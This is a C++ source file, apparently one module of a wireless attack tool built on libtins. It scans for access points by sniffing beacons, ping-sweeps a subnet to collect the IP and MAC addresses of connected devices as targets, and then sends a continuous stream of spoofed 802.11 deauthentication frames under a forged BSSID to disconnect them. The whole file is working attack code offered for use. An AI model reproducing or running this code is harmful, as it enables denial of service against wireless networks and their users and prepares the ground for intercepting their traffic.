#include <boost/algorithm/string.hpp>
#include <codecvt>
#include <iostream>
#include <thread>
#include <tins/icmp.h>
#include <zconf.h>

#include "Network.h"

using namespace Tins;

Network::Network() {}

Network::~Network() {}

void
Network::sendDeauth()
{
    Tins::Dot11Deauthentication deauthPacket;
    Tins::RadioTap radio;
    PacketSender sender;
    while (deauthing) {
        for (auto target : targets) {
            if (!deauthing) break;
            std::cout << "Deauthing " << target.first.to_string() << std::endl;
            deauthPacket = Dot11Deauthentication(target.second, spoofedBSSID);
            deauthPacket.addr3(spoofedBSSID); // Set the BSSID
            deauthPacket.reason_code(0x0007); // From airplay-ng
            radio = RadioTap() / deauthPacket;
            sender.send(radio, spoofingIfaceName);
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
        }
    }
}

void
Network::startDeauth()
{
    Tins::NetworkInterface spoofedIface(spoofingIfaceName);
    if (!spoofedIface.ipv4_address()) {
        std::cout << "[!] Interface " << spoofingIfaceName
                  << " does not have an IPv4 address!" << std::endl
                  << "[!] Exiting..." << std::endl;
        exit(1);
    }
    deauthing = true;
    deauthThread = std::thread(&Network::sendDeauth, this);
}

void
Network::stopDeauth()
{
    deauthing = false;
    deauthThread.join();
}

// TODO: Filter out non 802.11 interfaces
std::vector<std::wstring>
Network::getInterfaces()
{
    std::vector<std::wstring> interfacesNames;
    // First fetch all network interfaces
    std::vector<NetworkInterface> interfaces = NetworkInterface::all();
    // Now iterate them
    for (const NetworkInterface& iface : interfaces) {
        interfacesNames.push_back(iface.friendly_name());
    }

    return interfacesNames;
}

void
Network::scanDevices(Tins::PacketSender& sender, std::string iprange)
{
    auto networkRange = AddressRange<IPv4Address>::from_mask(defaultIface.ipv4_address(), defaultIface.ipv4_mask());
    if (!iprange.empty()) {
        // TODO: Validate the range
        int delimiter_pos = iprange.find("/");
        std::string base = iprange.substr(0, delimiter_pos);
        int mask = std::stoi(iprange.substr(delimiter_pos + 1, iprange.length() - delimiter_pos));
        networkRange = IPv4Address(base) / mask;
    } else {
        std::cout << "[*] Using " << defaultIface.ipv4_address().to_string() << " / " << defaultIface.ipv4_mask().to_string()<<std::endl;
    }
    NetworkInterface::Info infoScanner = defaultIface.info();
    for (const auto& target : networkRange) {
        IP ping = IP(target, infoScanner.ip_addr) / ICMP();
        sender.send(ping, defaultIface);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    ipScanning = false;
}

bool
Network::ipScanCallback(Tins::PDU& pdu)
{
    const EthernetII& eth = pdu.rfind_pdu<EthernetII>();
    const IP& ip = pdu.rfind_pdu<IP>();
    const ICMP& icmp = pdu.rfind_pdu<ICMP>();
    if (icmp.type() == ICMP::ECHO_REPLY) {
        std::cout << "\t-> " << ip.src_addr().to_string() << " ("
                  << eth.src_addr().to_string() << ")" << std::endl;
        targets.insert(std::pair<Tins::IPv4Address, Tins::HWAddress<6>>(
          ip.src_addr(), eth.src_addr()));
    }
    return ipScanning;
}

void
Network::getConnectedDevices(std::string iprange)
{
    //TODO: Race condition?
    SnifferConfiguration config;
    std::cout << "[*] Running IP scan on default interface "
              << defaultIface.name() << std::endl;
    config.set_promisc_mode(false);
    config.set_filter("ip proto \\icmp and not src host " +
                      defaultIface.addresses().ip_addr.to_string());
    Sniffer sniffer(defaultIface.name(), config);

    PacketSender sender;
    auto handler = bind(&Network::ipScanCallback, this, std::placeholders::_1);
    ipScanning = true;
    std::thread sniff_thread([&]() { sniffer.sniff_loop(handler); });
    scanDevices(sender, iprange);
    sniff_thread.join();
}

std::map<std::string, std::set<Dot11::address_type>>
Network::getAccessPoints()
{
    //TODO: Race condition?
    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_filter("type mgt subtype beacon");
    config.set_rfmon(true);
    Sniffer sniffer(spoofingIfaceName, config);

    std::thread scanThread(&Network::stopScan, &scanning);
    scanThread.detach();

    //scanning = true;
    sniffer.sniff_loop(make_sniffer_handler(this, &Network::scanCallback));

    //std::this_thread::sleep_for(std::chrono::seconds(5));
    //std::cout << "Stopping the scan" << std::endl;
    //scanning = false;

    return accessPoints;
}

// TODO: Either connect to AP to get the DHCP lease + netmask to derive the IPv4
// range to scan, or ask for a custom range.

bool
Network::scanCallback(PDU& pdu)
{
    // Get the Dot11 layer
    const Dot11Beacon& beacon = pdu.rfind_pdu<Dot11Beacon>();
    // All beacons must have from_ds == to_ds == 0
    if (!beacon.from_ds() && !beacon.to_ds()) {
        // Get the AP address
        address_type addr = beacon.addr2();
        // Look it up in our set
        ssids_type::iterator it = ssids.find(addr);
        if (it == ssids.end()) {
            // First time we encounter this BSSID.
            try {
                /* If no ssid option is set, then Dot11::ssid will throw
                 * a std::runtime_error.
                 */
                std::string ssid = beacon.ssid();
                // Save it so we don't show it again.
                ssids.insert(addr);
                // Display the tuple "address - ssid".
                if (!ssid.empty()) {
                    if (accessPoints.count(ssid)) {
                        std::set<Dot11::address_type> addresses =
                          accessPoints[ssid];
                        addresses.insert(addr);
                        accessPoints[ssid] = addresses;
                    } else {
                        std::set<Dot11::address_type> address;
                        address.insert(addr);
                        accessPoints.insert(std::make_pair(ssid, address));
                    }
                }
            } catch (std::runtime_error&) {
                // No ssid, just ignore it.
            }
        }
    }

    return scanning;
}

void
Network::stopScan(bool* scanning)
{
    sleep(5);
    *scanning = false;
}

void
Network::setSpoofingInterface(std::string interface)
{
    spoofingIfaceName = interface;
}

void
Network::setBssid(const HWAddress<6> hwAddress)
{
    spoofedBSSID = hwAddress;
}

std::string
Network::getBssid()
{
    return spoofedBSSID.to_string();
}
